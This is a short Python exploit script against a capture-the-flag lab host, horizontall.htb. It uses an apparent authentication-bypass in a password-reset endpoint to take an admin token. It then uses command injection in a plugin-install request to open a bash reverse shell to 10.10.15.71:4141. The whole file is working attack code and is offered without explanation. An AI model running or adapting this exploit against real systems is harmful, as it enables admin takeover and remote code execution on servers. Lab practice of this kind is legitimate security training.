import requests as r
import json

s = r.Session()
# Enable burp proxy
# s.proxies = {'http': 'localhost:8080'}
url = 'http://api-prod.horizontall.htb'

# Send Reset passowrd request to retrieve admin jwt token
reset_data = {"code": {}, "password": "p00rduck", "passwordConfirmation": "p00rduck"}
rspn = s.post(f"{url}/admin/auth/reset-password", json=reset_data)
json_pars = json.loads(rspn.content.decode())
print("[+] Reset Response: \n" + rspn.content.decode())

# Send reverse shell in plugins install request
s.headers = {'Authorization': f'Bearer {json_pars["jwt"]}'}
payload = {"plugin": "documentation && $(/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.71/4141 0>&1')", "port": "80"}
try:
    rspn = s.post(f"{url}/admin/plugins/install", json=payload, timeout=10)
    print(rspn.text)
except r.exceptions.Timeout:
    print('[!] Exception: timeout')
    
s.close()
